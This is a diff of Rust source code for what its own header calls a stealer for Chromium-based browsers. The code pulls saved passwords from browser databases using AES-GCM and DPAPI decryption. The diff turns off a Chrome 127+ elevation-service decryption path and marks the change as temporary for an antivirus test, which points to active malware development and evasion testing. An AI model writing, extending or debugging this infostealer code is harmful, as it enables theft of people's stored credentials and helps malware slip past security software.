@@ -1,7 +1,7 @@
 // Stealer para browsers basados en Chromium (Chrome, Edge, Brave, Opera)
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_local, file_exists, base64_decode};
-use crate::stealer::elevation_service; // ← COM API para v20
+// use crate::stealer::elevation_service; // ← TEMPORALMENTE DESHABILITADO para test AV
 use std::path::PathBuf;
 use rusqlite::Connection;
 use aes_gcm::{
@@ -265,15 +265,16 @@ fn extract_credentials_from_db(
                     result.unwrap()
                 } else {
                     writeln!(debug, "       ❌ AES-GCM FALLÓ").ok();
-                    // v20 (Chrome 127+): Usar elevation_service.exe COM API
-                    writeln!(debug, "       🔸 Intentando Elevation Service (v20)...").ok();
-                    if let Some(v20_password) = elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
-                        writeln!(debug, "       ✅ ELEVATION SERVICE OK (v20 decrypted)").ok();
-                        v20_password
-                    } else {
-                        writeln!(debug, "       ❌ Elevation Service falló").ok();
-                        "[decrypt failed]".to_string()
-                    }
+                    // v20 (Chrome 127+): elevation_service TEMPORALMENTE DESHABILITADO
+                    // writeln!(debug, "       🔸 Intentando Elevation Service (v20)...").ok();
+                    // if let Some(v20_password) = elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
+                    //     writeln!(debug, "       ✅ ELEVATION SERVICE OK (v20 decrypted)").ok();
+                    //     v20_password
+                    // } else {
+                    //     writeln!(debug, "       ❌ Elevation Service falló").ok();
+                    //     "[decrypt failed]".to_string()
+                    // }
+                    "[decrypt failed]".to_string()
                 }
             } else {
                 // Sin master key y DPAPI falló
